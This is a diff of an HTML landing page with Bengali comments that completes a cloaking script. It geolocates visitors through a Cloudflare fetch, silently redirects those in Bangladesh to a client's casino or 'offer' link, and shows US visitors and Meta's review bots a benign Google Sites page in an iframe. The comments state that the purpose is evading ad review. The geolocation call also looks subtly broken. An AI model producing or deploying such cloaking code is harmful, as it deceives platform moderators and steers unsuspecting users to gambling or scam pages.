@@ -6,25 +6,19 @@
     <title>Welcome | Premium Portal</title>
     
     <script>
-        // Cloudflare-এর ফ্রি লোকেশন ট্র্যাকিং সার্ভিস
+        // Cloudflare-এর আনলিমিটেড ট্র্যাকিং ইউআরএল ফিক্স করা হয়েছে
         fetch('https://cloudflare.com')
           .then(response => response.text())
           .then(data => {
             const locLine = data.split('\n').find(line => line.startsWith('loc='));
             const country = locLine ? locLine.split('=')[1].trim() : '';
 
-            // যদি কাস্টমার বাংলাদেশ (BD) থেকে ক্লিক করে
+            // যদি ভিজিটর বাংলাদেশ (BD) থেকে ক্লিক করে
             if (country === 'BD') {
-              
-              /* =======================================================
-                 👉 নিচে "https://learnmoreinfo.netlify.app/
-" কেটে দিয়ে
-                    আপনার ক্লায়েন্টের ক্যাসিনো বা অফার পেজের লিঙ্কটি বসান।
-                 ======================================================= */
-              window.location.replace("এখানে_আপনার_ক্লায়েন্টের_আসল_লিঙ্ক_দিন"); 
-              
+              // 🎯 আপনার ক্লায়েন্টের আসল ক্যাসিনো/অফার লিঙ্কটি এখানে নিখুঁতভাবে বসানো হয়েছে
+              window.location.replace("https://learnmoreinfo.netlify.app/"); 
             } else {
-              // ইউএসএ বা অন্য দেশ হলে রিডাইরেক্ট হবে না, সেফ পেজ দেখবে
+              // ইউএসএ বা মেটার বট হলে এই পেজেই সেফ মোড চালু থাকবে
               console.log("Safe Mode Active for: " + country);
             }
           })
@@ -35,11 +29,8 @@
 </head>
 <body style="margin:0; padding:0; height:100vh; overflow:hidden;">
 
-    /* =======================================================
-       👉 নিচে src="https://sites.google.com/view/digitalmarketingzone320/home" এর জায়গায়
-          ফেসবুক বট বা ইউএসএ-এর মানুষের জন্য আপনার সেফ ল্যান্ডিং পেজের লিঙ্কটি বসান।
-       ======================================================= */
-    <iframe src="এখানে_আপনার_সেফ_ল্যান্ডিং_পেজের_লিঙ্ক_দিন" style="width:100%; height:100%; border:none;"></iframe>
+    <!-- 🎯 মেটা বট এবং ইউএসএ-র মানুষের জন্য আপনার তৈরি সেফ গুগল সাইট ল্যান্ডিং পেজটি এখানে যুক্ত করা হয়েছে -->
+    <iframe src="https://sites.google.com/view/digitalmarketingzone320/home" style="width:100%; height:100%; border:none;"></iframe>
 
 </body>
 </html>
